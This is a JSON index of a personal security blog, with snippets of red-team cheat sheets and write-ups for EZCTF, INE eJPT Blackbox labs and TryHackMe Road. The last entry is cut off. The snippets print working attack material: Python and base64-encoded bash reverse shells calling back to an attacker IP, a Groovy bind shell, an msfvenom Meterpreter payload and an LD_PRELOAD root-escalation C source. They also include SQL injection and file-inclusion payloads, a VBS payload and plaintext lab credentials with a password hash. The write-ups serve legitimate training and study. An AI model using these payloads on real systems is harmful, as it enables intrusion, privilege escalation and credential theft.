[ { "title": "[Knowledge] Weaponization and Payloads", "url": "/posts/Red-Team-Weaponization/", "categories": "Tool, Knowledge, Cheatsheet, RedTeam", "tags": "tool, knowledge, cheatsheet, redteam", "date": "2022-05-09 13:00:00 -0600", "snippet": "Windows Scripting Host (WSH) A sample payload Set shell = WScript.CreateObject(&quot;Wscript.Shell&quot;)shell.Run(&quot;C:\\Windows\\System32\\calc.exe &quot; &amp;amp; WScript.ScriptFullName),0,True To run the payload from the CMD c:\\Windows\\System32&amp;gt;wscript &quot;c:\\Users\\thm\\Desktop\\payload.vbs&quot; c:\\Windows\\System32&amp;gt;cscript.exe &quot;c:\\Users\\thm\\Desktop\\payload.vbs&quot; Run vbs if it’s blocked by renaming the file to .txtc:\\Windows\\System32&amp;gt;wscript /e:VBScript &quot;c:\\Users\\thm\\Desktop\\payload.txt&quot;" }, { "title": "[Knowledge] Red Team Reconnaissance", "url": "/posts/Red-Team-Recon/", "categories": "Tool, Knowledge, Cheatsheet, RedTeam", "tags": "tool, knowledge, cheatsheet, redteam", "date": "2022-05-08 16:00:00 -0600", "snippet": "Source https://tryhackme.com/room/redteamreconwhois A WHOIS server listens on TCP port 43 for incomming requests. The domain registrar is responsible for maintaining the WHOIS records for the domain names it is leasing. whois will query the WHOIS server to provide all saved records. Registrar WHOIS server Registrar URL Record creation date Record update date Registrant contact info and address (unless withheld for privacy) Admin contact info and address (unless witheld for privacy) Tech contact info and address (unless withheld for privacy) ┌──(kali㉿kali)-[~/Desktop/blog/rcs-tringuyen.github.io]└─$ whois thmredteam.com Domain Name: THMREDTEAM.COM Registry Domain ID: 2643258257_DOMAIN_COM-VRSN Registrar WHOIS Server: whois.namecheap.com Registrar URL: http://www.namecheap.com Updated Date: 2021-10-13T20:54:46Z Creation Date: 2021-09-24T14:04:16Z Registry Expiry Date: 2022-09-24T14:04:16Z Registrar: NameCheap, Inc. Registrar IANA ID: 1068 Registrar Abuse Contact Email: abuse@namecheap.com Registrar Abuse Contact Phone: +1.6613102107 Domain Status: clientTransferProhibited https://icann.org/epp#clientTransferProhibited Name Server: KIP.NS.CLOUDFLARE.COM Name Server: UMA.NS.CLOUDFLARE.COM DNSSEC: unsigned URL of the ICANN Whois Inaccuracy Complaint Form: https://www.icann.org/wicf/&amp;gt;&amp;gt;&amp;gt; Last update of whois database: 2022-05-08T23:07:06Z &amp;lt;&amp;lt;&amp;lt;The Registry database contains ONLY .COM, .NET, .EDU domains andRegistrars.Domain name: thmredteam.comRegistry Domain ID: 2643258257_DOMAIN_COM-VRSNRegistrar WHOIS Server: whois.namecheap.comRegistrar URL: http://www.namecheap.comUpdated Date: 0001-01-01T00:00:00.00ZCreation Date: 2021-09-24T14:04:16.00ZRegistrar Registration Expiration Date: 2022-09-24T14:04:16.00ZRegistrar: NAMECHEAP INCRegistrar IANA ID: 1068Registrar Abuse Contact Email: abuse@namecheap.comRegistrar Abuse Contact Phone: +1.9854014545Reseller: NAMECHEAP INCDomain Status: clientTransferProhibited https://icann.org/epp#clientTransferProhibitedRegistry Registrant ID: Registrant Name: Redacted for PrivacyRegistrant Organization: Privacy service provided by Withheld for Privacy ehfRegistrant Street: Kalkofnsvegur 2 Registrant City: ReykjavikRegistrant State/Province: Capital RegionRegistrant Postal Code: 101Registrant Country: ISRegistrant Phone: +354.4212434Registrant Phone Ext: Registrant Fax: Registrant Fax Ext: Registrant Email: e17b7976233e4e72a76b3dadb1d574bd.protect@withheldforprivacy.comRegistry Admin ID: Admin Name: Redacted for PrivacyAdmin Organization: Privacy service provided by Withheld for Privacy ehfAdmin Street: Kalkofnsvegur 2 Admin City: ReykjavikAdmin State/Province: Capital RegionAdmin Postal Code: 101Admin Country: ISAdmin Phone: +354.4212434Admin Phone Ext: Admin Fax: Admin Fax Ext: Admin Email: e17b7976233e4e72a76b3dadb1d574bd.protect@withheldforprivacy.comRegistry Tech ID: Tech Name: Redacted for PrivacyTech Organization: Privacy service provided by Withheld for Privacy ehfTech Street: Kalkofnsvegur 2 Tech City: ReykjavikTech State/Province: Capital RegionTech Postal Code: 101Tech Country: ISTech Phone: +354.4212434Tech Phone Ext: Tech Fax: Tech Fax Ext: Tech Email: e17b7976233e4e72a76b3dadb1d574bd.protect@withheldforprivacy.comName Server: kip.ns.cloudflare.comName Server: uma.ns.cloudflare.comDNSSEC: unsignedURL of the ICANN WHOIS Data Problem Reporting System: http://wdprs.internic.net/&amp;gt;&amp;gt;&amp;gt; Last update of WHOIS database: 2022-05-08T00:07:19.26Z &amp;lt;&amp;lt;&amp;lt;For more information on Whois status codes, please visit https://icann.org/epp We can gain lots of valuable information with only a domain name. We might get lucky and find names, email, postal addresses, phone numbers.nslookupdig Domain Information Groper dig even allows you to specify a different DNS server to use. For example, using Cloudflare DNS server: dig @1.1.1.1 tryhackme.com host Alternative for querying DNS servers for DNS records.┌──(kali㉿kali)-[~/Desktop/blog/rcs-tringuyen.github.io]└─$ host cafe.thmredteam.comcafe.thmredteam.com has address 172.67.212.249cafe.thmredteam.com has address 104.21.93.169cafe.thmredteam.com has IPv6 address 2606:4700:3034::6815:5da9cafe.thmredteam.com has IPv6 address 2606:4700:3034::ac43:d4f9traceroute / tracertAdvance Search Syntax Function search phrase Exact search phrase OSINT filetype:pdf Find pdf files related to a certain term salary site:blog.tryhackme.com Limit result to a specific site pentest -site:example.com Exclude a specific site walkthorugh intitle:TryHackMe Find pages with a specific term in the page title challenge inurl:tryhackme Find pages with a specific term in the page url Google Advanced Search Google Refine Web Searches DuckDuckGo Search Syntax Bing Advanced Search Options Can lead to confiential information such as: Documents for internal company use Confidential spreadsheets with usernames, emails, even passwords Files containing usernames Files containing usernames Sensitive directories Service version number (some of which might vulnerable and unpatched) Error messages Specific advanced Google search terms that can lead to confidential informations: Google Hacking Database Example: FootholdsConsider GHDB-ID: 6364 as it uses the query intitle:&quot;index of&quot; &quot;nginx.log&quot; to discover Nginx logs and might reveal server misconfigurations that can be exploited. Files Containing UsernamesFor example, GHDB-ID: 7047 uses the search term intitle:&quot;index of&quot; &quot;contacts.txt&quot; to discover files that leak juicy information. Sensitive DirectoriesFor example, consider GHDB-ID: 6768, which uses the search term inurl:/certs/server.key to find out if a private RSA key is exposed. Web Server DetectionConsider GHDB-ID: 6876, which detects GlassFish Server information using the query intitle:&quot;GlassFish Server - Server Running&quot;. Vulnerable FilesFor example, we can try to locate PHP files using the query intitle:&quot;index of&quot; &quot;*.php&quot;, as provided by GHDB-ID: 7786. Vulnerable ServersFor instance, to discover SolarWinds Orion web consoles, GHDB-ID: 6728 uses the query intext:&quot;user name&quot; intext:&quot;orion core&quot; -solarwinds.com. Error MessagesPlenty of useful information can be extracted from error messages. One example is GHDB-ID: 5963, which uses the query intitle:&quot;index of&quot; errors.log to find log files related to errors. Social Media LinkedIn, Twitter, Facebook, Instagram, Glassdoor, etc.Job Ads Revealing names and emails Could give insights to the company’s tech stack, systems and infrastructure. Wayback Machine can be useful to retrieve previous versions of a job opening page.ViewDNS.info It is common nowadays to share an IP address across web server. Using reverse IP lookup, we can find other servers sharing the same IP addresses used by a domain name.Threat Intelligence Platform https://threatintelligenceplatform.com/ Launch a series of tests from malware checks to WHOIS and DNS queries.Censys Search https://search.censys.io/ Provide information about IP addresses and domains.Shodan You can use Shodan from the command line: https://cli.shodan.io/ E.g. to find your Internet-facing IP: shodan myipRecon-ng A framework that helps automate OSINT work. 1. Creating a Workspace workspaces create WORKSPACE_NAME recon-ng -w WORKSPACE_NAME starts recon-ng with the specific workspace.2. Seeding the Database db schema to check the names of the tables in our database. db insert domains to insert the domain name into the domains table.3. Recon-ng Marketplace We will search for suitable modules from the marketplace. Useful commands related to marketplace usage: marketplace search KEYWORD to search for available modules with keyword. marketplace info MODULE to provide information about th emodule in question. marketplace install MODULE to install the specified module into Recon-ng. marketplace remove MODULE to uninstall the specified module. Multiple categories, such as discovery, import, recon and reporting. marketplace search to get a list of all available modules E.g.: marketplacec search domains- to search for modules containing domains- marketplace install google_site_web4. Working with Installed Moduled modules search to get a list of all the installed modules modules load MODULE to load a specific module to memory E.g.: module load viewdns_reverse_whois. To run it, we need to set the required options: options list to list the options that we can set for the loaded module. options set &amp;lt;option&amp;gt; &amp;lt;value&amp;gt; to set the value of the option. 5. Keys Some modules cannot be used without a key fro the respective service API. K indicates that you need to provide the relevant service key to use the module in question. keys list lists the key keys add KEY_NAME KEY_VALUE adds a key keys remove KEY_NAME removes a key options list list the available options for the chosen module. options set NAME VALUEMaltego Application blends mind-mapping with OSINT. Start with a domain name, company name, person’s name, email, etc." }, { "title": "[EZCTF] Report", "url": "/posts/EZCTF-2022/", "categories": "CTF, Write Up", "tags": "ctf, write-up", "date": "2022-05-07 17:00:00 -0600", "snippet": "Introduction This CTF was 24 hours on May 6th and May 7th. Pretty basic stuff but I only did web exploitation and the others are too CTF specific and just puzzle so I didn’t bother. Fun experience otherwise :) ForensicsDigitalOcean (50 points) The flag is in the slide, not hidden or anything. EZ-CTF{TH1S_1S_FR33}WebSuper Secure (100 points) http://ez.ctf.cafe:8888 Try OR 1=1&#39; it returns a SQL Error. So the form is susceptible to SQLi. I tried running SQLMap but it does not yield immediate result. I browse to PayLoadAllTheThing GitHub and use this payload &#39; or 1=1 limit 1 -- -+. EZ-CTF{N0t_S0_S4f3_4ft3r_411}I made a blog! (150 points) http://ez.ctf.cafe:9999 The site is vulnerable to LFI: http://ez.ctf.cafe:9999/blog-posts.php?file=../../../../../etc/passwd Running dirsearch we see interesting results such as /robots.txt, /flag.php. flag.php: How do you filter your coffee? I tried a couple more LFI to RCE but not working. This guide helped me a lot: https://d00mfist.gitbooks.io/ctf/content/local_file_inclusion.html In order to show the content of flag.php, I used the payload: php://filter/convert.base64-encode/resource=flag.php EZ-CTF{LFI_1S_3Z}Race 1 (200 points) &amp;amp; Race 2 (300 points) Sadly someone DDOS the 2 challenges. The organizer decided to give out the flag for everyone. Kudos to them and big L to the one ruining the fun. EZ-CTF{R3C_T0_34SY_F0R_M3} EZ-CTF{1_4M_PR3TTY_G00D_4T_R3C}OSINTAmerican (150 points) Find the Gallery, find Mr. Gud, find the cow. Flag format: EZ-CTF{Mr_Gud_Full_Name_Cow_Painting_Name} Using reverse image search, we found the gallery: https://www.thesignaturegallery.com/artists/james-ayers/ Go to the Artist page, CTRL+F for Gud we can find the artist. EZ-CTF{Trent_Gudmundsen_Young_Holstein}Alien Dream (100 points) Find the painter and find the Bigfoot Flag format: EZ-CTF{Painter_Painting_Name} Reverse image search again, we are arrived at the gallery: https://boonegallery.com/ EZ-CTF{Amy_Cordova_Summer_Of_Love} Hue is This? (170 points) Don’t rotate 180 Reverse image search, https://www.discogs.com/release/3724-The-Green-Nuns-Of-The-Revolution-Rock-Bitch-Mafia EZ-CTF{India_Waters_Rock_Bitch} Limo (190 points) Using Google Image search does not work. Use Yandex: https://yandex.com/images/search?cbir_id=1043830%2F3c-vrkY8PlddLt8Md17p0A9827&amp;amp;pos=0&amp;amp;rpt=imageview&amp;amp;img_url=https%3A%2F%2Fcoub-anubis-a.akamaized.net%2Fcoub_storage%2Fcoub%2Fsimple%2Fcw_image%2F65b740110ed%2F08b66f032f17897be1daf%2F1473499422_00029.jpg&amp;amp;cbir_page=similar&amp;amp;url=https%3A%2F%2Favatars.mds.yandex.net%2Fget-images-cbir%2F1043830%2F3c-vrkY8PlddLt8Md17p0A9827%2Forig The band is Aphex Twin and the song is Windowlickers EZ-CTF{Aphex_Twin_76_Windows} Follow Avis (280 points) Time to move forward and get on the road On your journey find the unblurred license plateshorturl.at/ptAS1 Just move forward ;) EZ-CTF{241340_P}CryptoNo Kidding (70 points)8/44/444/7777\\\\\\444/7777\\\\\\8/44/33\\\\\\555/2/6/33/7777/8\\\\\\222/8/333\\\\\\333/555/2/4\\\\\\33/888/33/33/33/33/777 Use this to decrypt: https://www.dcode.fr/multitap-abc-cipherOMG (80 points) This is free. EZ-CTF{1_HAT3_TH15_FL4G} SteganographyBernie (125 points) steghide extract -sf Bernie.jfifs = &quot;\\28x\\32x\\38x\\28x\\32x\\38x\\28x\\32x\\38x\\28x\\32x\\38xE\\28x\\32x\\38x\\28x\\32x\\38xZ\\28x\\32x\\38x-\\28x\\32x\\38xC\\28x\\32x\\38x\\28x\\32x\\38xT\\28x\\32x\\38xF\\28x\\32x\\38x{N\\28x\\32x\\38xO\\28x\\32x\\38xW\\28x\\32x\\38x_\\28x\\32x\\38x\\28x\\32x\\38xY\\28x\\32x\\38x\\28x\\32x\\38xO\\28x\\32x\\38xU_\\28x\\32x\\38xS\\28x\\32x\\38x\\28x\\32x\\38x\\28x\\32x\\38x\\28x\\32x\\38xE\\28x\\32x\\38x\\28x\\32x\\38xE\\28x\\32x\\38x_\\28x\\32x\\38xM\\28x\\32x\\38xE\\28x\\32x\\38x\\28x\\32x\\38x_\\28x\\32x\\38xN\\28x\\32x\\38xI\\28x\\32x\\38x\\28x\\32x\\38xC\\28x\\32x\\38xE\\28x\\32x\\38x}\\28x\\32x\\38x\\28x\\32x\\38x\\28x\\32x\\38x\\28x\\32x\\38x\\28x\\32x\\38x\\28x\\32x\\38x&quot;ret = s.replace(&quot;\\28x\\32x\\38x&quot;, &quot;&quot;)print(ret)NEO (150 points) Using a bunch of tools from HackTricks: https://book.hacktricks.xyz/crypto-and-stego/stego-tricks This stegsolve works. https://github.com/eugenekolo/sec-tools/tree/master/stego/stegsolve EZ-CTF{YOU_TOOK_TH3_R3D_P1LL_DIDNT_YOU} PWNMario (100 points) I thought this was PyJail but apparently not. Try buffer overflow but not working. Then I tried * then it listed all file in the directory. ;cat flag.txt EZ-CTF{UNSECUR3_B4SH} Peach (300 points) Research pyjail, python sandbox escape print(__builtins__.open(&#39;flag.txt&#39;, &#39;rb&#39;).read()) " }, { "title": "[Announcement] I promise I will upload write-ups!", "url": "/posts/Announcement/", "categories": "Annoucement", "tags": "Annoucement", "date": "2022-01-18 19:38:00 -0700", "snippet": " I promise I will post things. I am grinding through CTFs and having a full-time 5th year CS student workload :( In the meantime you can check on my latest notes at https://github.com/rcs-tringuyen/hack-the-box Cheers! " }, { "title": "[eJPT] INE Blackbox 3", "url": "/posts/INE-Blackbox-3/", "categories": "CTF, Write Up", "tags": "ctf, write-up, ine, ejpt", "date": "2022-01-12 17:00:00 -0700", "snippet": "INE Blackbox 3 Our machine: 192.246.198.2Enumeration 1: Target: server1.ine.local = 192.246.198.3 Nmap: nmap -sT -P0 192.246.198.3 —&amp;gt; Port 80 opens. Go to the server on our browser you will see a message: Debugger has turned on. Please visit /console for the debugger Go to 192.246.198.3/console —&amp;gt; You can run Python code on this. I use payload: import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.246.198.2&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]); ** Alternatively ** You can exploit this server using Metasploit’s exploit/multi/http/werkzeug_debug_rce to gain a direct Meterpreter We can’t use msfvenom to craft a payload to upgrade our shell. Instead, background the current shell session by using Ctrl+Z. Then search for shell_to_meterpreter module. Set the SESSION option to 1 (which is our reverse shell) —&amp;gt; Run and we receive the upgraded meterpreter shell on session 2. Next I tried to move on to the second machine but can’t exploit MySQL. Hmm maybe we still have some information in the first machine we can further exploit. Some interesting post exploitation module for linux can be found here https://www.infosecmatter.com/post-exploitation-metasploit-modules-reference/. I used: (please use more if you’re actually exploiting targets) post/linux/gather/enum_system post/linux/gather/enum_users_history Nothing interesting in enum_system, you can see a bunch of users. When enumerating user history, notice that we can see user history of user auditor: [+] bash history for auditor stored in /root/.msf4/loot/20220113024628_default_192.246.198.3_linux.enum.users_769960.txt Let’s have a look. If you look through the log, there are some interesting information:mysql -h 192.246.198.4 -u root -pfArFLP29UySm4bZjbin/mysqladmin -u root password &#39;new-password&#39; Hey, 192.246.198.4 is our second target! And with a Nmap scan, it’s only a database server. Let’s connect to it using root:pfArFLP29UySm4bZjEnumeration 2 I tried manually enumerating this mysql server but nothing prevails. Looking into exploiting with Metasploit to somehow gain a shell.. Hmm. Some failed attempts but eventually you need to use this module: 22 exploit/multi/mysql/mysql_udf_payload 2009-01-16 excellent No Oracle MySQL UDF Payload ExecutionModule options (exploit/multi/mysql/mysql_udf_payload): Name Current Setting Required Description ---- --------------- -------- ----------- FORCE_UDF_UPLOAD true no Always attempt to install a sys_exec() mysql.function. PASSWORD fArFLP29UySm4bZj no The password for the specified username RHOSTS server2.ine.local yes The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&amp;lt;path&amp;gt;&#39; RPORT 3306 yes The target port (TCP) SRVHOST 0.0.0.0 yes The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses. SRVPORT 8080 yes The local port to listen on. SSL false no Negotiate SSL for incoming connections SSLCert no Path to a custom SSL certificate (default is randomly generated) URIPATH no The URI to use for this exploit (default is random) USERNAME root no The username to authenticate asPayload options (linux/x86/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 192.246.198.2 yes The listen address (an interface may be specified) LPORT 5555 yes The listen portExploit target: Id Name -- ---- 1 Linux Actually my Hera lab instance failed and giving weird bug so I refreshed it. ACTUALLY I noticed the correct credential should be fArFLP29UySm4bZj without the first letter p…. We FOUND the flag in /root/flag.txt: 4c537c0dfd18bafdcd59f53c7015550e Enumeration 3 Nmap-ing server3.ine.local:22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.5 (Ubuntu Linux; protocol 2.0)8080/tcp open http Apache Tomcat/Coyote JSP engine 1.1 Let’s go to our browser to have a look. Dirb this webserver!---- Scanning URL: http://server3.ine.local:8080/ ----+ http://server3.ine.local:8080/docs (CODE:302|SIZE:0) + http://server3.ine.local:8080/examples (CODE:302|SIZE:0) + http://server3.ine.local:8080/host-manager (CODE:302|SIZE:0) + http://server3.ine.local:8080/index.html (CODE:200|SIZE:262) + http://server3.ine.local:8080/manager (CODE:302|SIZE:0) Go to docs we foundout they are using tomcat 8.0.53. I tried using exploit/multi/http/tomcat_jsp_upload_bypass but it wasn’t working. Next I use auxiliary/scanner/http/tomcat_mgr_login set RHOSTS to server3.ine.local. Found the credentials of tomcat:s3cret Now we exploit the WAR upload function of Tomcat Manager. We use exploit/multi/http/tomcat_mgr_upload: Module options (exploit/multi/http/tomcat_mgr_upload): Name Current Setting Required Description ---- --------------- -------- ----------- HttpPassword s3cret no The password for the specified username HttpUsername tomcat no The username to authenticate as Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS server3.ine.local yes The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&amp;lt;path&amp;gt;&#39; RPORT 8080 yes The target port (TCP) SSL false no Negotiate SSL/TLS for outgoing connections TARGETURI /manager yes The URI path of the manager app (/html/upload and /undeploy will be used) VHOST no HTTP server virtual hostPayload options (java/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 192.246.198.2 yes The listen address (an interface may be specified) LPORT 7777 yes The listen portExploit target: Id Name -- ---- 0 Java Universal FLAG1 is at /opt/tomcat: EBCFE35ACC27E0EA91CF3A5AB600BABE cat /etc/shadow gives us: robert:$6$D4O99Z5L$Q38CW.ym42GmIbjZRh8DA2rtLHxXgMj.ahVbrBrbWvuBXmP555cGuLG1hkQE1R0eQVX48Rs7yecdU7V96u5Tf0:17822:::::: Enumerating the tomcat’s conf folder we can see conf.tar.gz. tar -xf conf.tar.gz; cd conf; cat tomcat-users.xml we can see robert’s password. (OR we could have crack the password hash) robert:robert@1234567890!@# Now we ssh to the machine! FLAG2: EC2986081E84BB845541D5CC0BEE13B3 We spawn a TTY shell: python -c &#39;import pty; pty.spawn(&quot;/bin/sh&quot;)&#39; By using sudo -l we know that robert can use ls as root. ls /root shows that there is a third flag FLAG3 Also env_keep+=LD_PRELOAD is present! Time to escalate some privilege. Write shell.c with vim with the following content: #include &amp;lt;stdio.h&amp;gt;#include &amp;lt;sys/types.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;void _init() { unsetenv(&quot;LD_PRELOAD&quot;); setgid(0); setuid(0); system(&quot;/bin/bash&quot;);} Then compile it using: gcc -fPIC -shared -o shell.so shell.c -nostartfiles Finally: sudo LD_PRELOAD=/home/robert/shell.so ls FLAG3: 560648FC63F090A8CF776326DC13FAC7 " }, { "title": "[eJPT] INE Blackbox 2", "url": "/posts/INE-Blackbox-2/", "categories": "CTF, Write Up", "tags": "ctf, write-up, ine, ejpt", "date": "2022-01-11 18:30:00 -0700", "snippet": "INE Blackbox 2Enumeration 1: Target: online-calc.com Running nmap -sS -Pn -v online-calc.com: 80/tcp open http5000/tcp open upnp8000/tcp open http-alt If you go to online-calc.com, online-calc.com:5000 and online-calc.com:8000 you will know that all of these are http web servers. We use dirb scan on all of these host, the only one that return a suspicious answer is: dirb online-calc.com:8000 which return: ---- Scanning URL: http://online-calc.com:8000/ ----+ http://online-calc.com:8000/.git/HEAD (CODE:200|SIZE:23) + http://online-calc.com:8000/console (CODE:200|SIZE:1985) The console page is locked by a PIN which shows on the shell run by the server. Run dirb on http://online-calc.com:8000/.git =&amp;gt; We know that HEAD and config file are exposed Download /.git/config file we sees something interesting: [remote &quot;origin&quot;] url = http://online-calc.com/projects/online-calc fetch = +refs/heads/*:refs/remotes/origin/* Clone the following URL to our machine. If we read the API.py file, make sure the isValid function always return True. Then commit the new file by doing: git add .git commit -m &quot;Exploit&quot; --author &quot;Jeremy McCarthy &amp;lt;jeremy@dummycorp.com&amp;gt;&quot;git push username: jeremypassword: diamonds We know the password in the config file. Now we need to craft a payload for reverse shell https://stackoverflow.com/questions/59519289/python-running-reverse-shell-inside-eval root@INE:~/online-calc# echo &#39;bash -c &quot;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.231.2/4444 0&amp;gt;&amp;amp;1&quot;&#39; | base64YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIzMS4yLzQ0NDQgMD4mMSIK Then use the following payload in the calculator at port 5000__import__(&quot;os&quot;).system(&quot;echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIzMS4yLzQ0NDQgMD4mMSIK | base64 -d | bash&quot;) No flag in /root lol We need to find the flag using: find / -iname *flag* 2&amp;gt;/dev/null cat /tmp/flag3b2b474c06380f696b38c1498f795e054374Enumeration 2 We still need a reverse meterpreter shell. Using msfvenom on our machinemsfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.231.2 LPORT=5555 -f elf &amp;gt; shell.elf Start a simple python http server on our machine, then using the online-calc machine, we retrieve that file using wget On our machine, in metasploit, we start a use exploit/multi/handler on port 5555, IP 192.168.231.2 . We set our payload being linux/x86/meterpreter/reverse_tcp Once we received a Meterpreter shell, run ipconfig. Name : eth1Hardware MAC : 02:42:c0:bf:5c:02MTU : 1500Flags : UP,BROADCAST,MULTICASTIPv4 Address : 192.191.92.2IPv4 Netmask : 255.255.255.0 So our second target is within 192.191.92.0/24 range. But first we need to autoroute it to our metasploit session. meterpreter &amp;gt; run autoroute -s 192.191.92.0 Now we need proxy chain to further scan our second target: https://www.offensive-security.com/metasploit-unleashed/proxytunnels/ We use the module auxiliary/server/socks_proxy set the version to 4a, port to 9050 (because proxychains default port is 9050) –&amp;gt; Run the module In another terminal, run proxychains nmap -P0 -sT 192.191.92.3 —&amp;gt; Port 8080 is open Now we need to access the second machine’s 8080 webpage on our machine. In firefox, go to preference then search for proxy, select manual proxy configuration. SOCKS host is 127.0.0.1, port is 9050 and uses socks v4. Tada you can now reach 192.192.92.3:8080 —&amp;gt; A Jenkins webserver. When you go to the Groovy script, we will now create a BIND NETCAT SHELL (not Reverse) and use our machine proxychains to connect to it. The payload is: Source: https://dzmitry-savitski.github.io/2018/03/groovy-reverse-and-bind-shell int port=5555;String cmd=&quot;/bin/sh&quot;;Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start()Socket s = new java.net.ServerSocket(port).accept()InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()&amp;gt;0)so.write(pi.read());while(pe.available()&amp;gt;0)so.write(pe.read());while(si.available()&amp;gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close(); On our attacking machine run: proxychains nc -v 192.191.92.3 5555 We now gain shell access on the target second machine! " }, { "title": "[eJPT] INE Blackbox 1", "url": "/posts/INE-Blackbox-1/", "categories": "CTF, Write Up", "tags": "ctf, write-up, ine, ejpt", "date": "2022-01-11 14:30:00 -0700", "snippet": "INE Blackbox 1Enumeration 1 Target: demo.ine.local (call this demo1) Our machine’s eth1: 192.141.206.2 ping demo.ine.local —&amp;gt; 192.141.206.3 Our target is running V-CMS v1.0 Exploitation 1 Search for V-CMS exploit in Metasploit, we can see a PHP shell upload vulnerability. We need to change these following options: RHOSTS: 192.141.206.3 # our targetTARGETURI: /LHOST: 192.141.206.2 # our machine getuid in Meterpreter —&amp;gt; root (0) If we go to /root , we can see the flag being 4f96a3e848d233d5af337c440e50fe3d Enumeration 2 If we cat /etc/hosts or ifconfig we can see demo1 has another IP of 192.79.65.2 . So our second target must be on the same network.inet 192.79.65.2 netmask 255.255.255.0 broadcast 192.79.65.255 We need to route this IP. https://www.infosecmatter.com/metasploit-module-library/?mm=post/multi/manage/autoroute We run meterpreter &amp;gt; run autoroute -s 192.79.65.0 SOMEHOW THIS DOESN’T WORK Then background the current session, run nmap -v -sn 192.79.65.0/24 —-&amp;gt; We will see 192.79.65.1 is up THIS WORK Using auxiliary/scanner/portscan/tcp PORTS: 80,8080, 445, 21, 22RHOSTS: 192.79.65.1-10 Port 21 on 192.79.65.3 is open, we need to port forward it to our machine. We use this https://www.offensive-security.com/metasploit-unleashed/portfwd/ In Meterpreter portfwd add -l 1234 -p 21 -r 192.79.65.3 To detech the version I used nmap -p 1234 -sV localhost Exploitation 2 You can search for vsftpd 2.0.8 exploit metasploit on Google or in Metasploit, just search vsftpd We use exploit/unix/ftp/vsftpd_234_backdoor If you set the options to localhost:1234 it won’t work. The correct options: RHOSTS: 192.79.65.3RHOST: 21 cat /root/flag.txt —&amp;gt; Flag 58c7c29a8ab5e7c4c06256b954947f9a" }, { "title": "[TryHackMe] Road", "url": "/posts/TryHackMe-Road/", "categories": "CTF, Write Up", "tags": "ctf, write-up, tryhackme, road, thm", "date": "2021-11-30 20:40:00 -0700", "snippet": "Enumerationnmap Port 80 and 22 opengobuster No stand out dirs.OWASP ZAP Path traversal detected but I think this is false positive.Manual enumeration: Created an account: sky@thm.com password If you go to your edit profile, scroll down, you will see a line, under uploading profile image saying Right now, only admin has access to this feature. Please drop an email to admin@sky.thm in case of any changes.We found the admin account’s username + this maybe where we upload a reverse shell. Reset Password doesn’t seem to check anything. I will use Burp to intercept this request and change the pw for the admin account Actually I decided to edit the disabled form field on the website, replacing my account’s username with the admin’s username. This is easier and faster! Password change successfully! I uploaded the pentestmonkey’s php_reverse_shell.php but I didn’t know where to activate the php. Clicking on the avatar wasn’t workingTry /assets/img but our php wasn’t there - might be extension checking? I viewed the edit profile page’s source, there is a hidden url called /v2/profileimages which disable dir listing. But we know the file’s name!Tried http://10.10.86.228/v2/profileimages/php-reverse-shell.php PWNED!Reverse Shell There is an account called “webdeveloper”. You can file the user.txt in the home directory. I tried enum around using the “www-data” but nothing was working. No .ssh folder we can use. cat /etc/passwd you will see 2 accounts: mysql and mongo Try running mysql not workingHowever mongo works I used the commands on mongo’s shell documentation. show databases;use backup; # only this one workedshow collections; # will show user as a collectiondb.user.find() This will list all the backup users:{ &quot;_id&quot; : ObjectId(&quot;60ae2661203d21857b184a76&quot;), &quot;Month&quot; : &quot;Feb&quot;, &quot;Profit&quot; : &quot;25000&quot; }{ &quot;_id&quot; : ObjectId(&quot;60ae2677203d21857b184a77&quot;), &quot;Month&quot; : &quot;March&quot;, &quot;Profit&quot; : &quot;5000&quot; }{ &quot;_id&quot; : ObjectId(&quot;60ae2690203d21857b184a78&quot;), &quot;Name&quot; : &quot;webdeveloper&quot;, &quot;Pass&quot; : &quot;BahamasChapp123!@#&quot; }{ &quot;_id&quot; : ObjectId(&quot;60ae26bf203d21857b184a79&quot;), &quot;Name&quot; : &quot;Rohit&quot;, &quot;EndDate&quot; : &quot;December&quot; }{ &quot;_id&quot; : ObjectId(&quot;60ae26d2203d21857b184a7a&quot;), &quot;Name&quot; : &quot;Rohit&quot;, &quot;Salary&quot; : &quot;30000&quot; }SSHwebdeveloper@sky:~$ sudo -lMatching Defaults entries for webdeveloper on sky: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, env_keep+=LD_PRELOADUser webdeveloper may run the following commands on sky: (ALL : ALL) NOPASSWD: /usr/bin/sky_backup_utility Notice env_keep+=LD_PRELOAD is set. Comiple a c file with this content #include &amp;lt;stdio.h&amp;gt;#include &amp;lt;sys/types.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;void _init() { unsetenv(&quot;LD_PRELOAD&quot;); setgid(0); setuid(0); system(&quot;/bin/bash&quot;);} Then rungcc -fPIC -shared -o exploit.so exploit.c -nostartfilessudo LD_PRELOAD=exploit.so /usr/bin/sky_backup_utility" }, { "title": "[TryHackMe] Looking Glass", "url": "/posts/TryHackMe-LookingGlass/", "categories": "CTF, Write Up", "tags": "ctf, write-up, tryhackme, looking-glass, thm, wonderland", "date": "2021-11-21 17:00:00 -0700", "snippet": "IP: 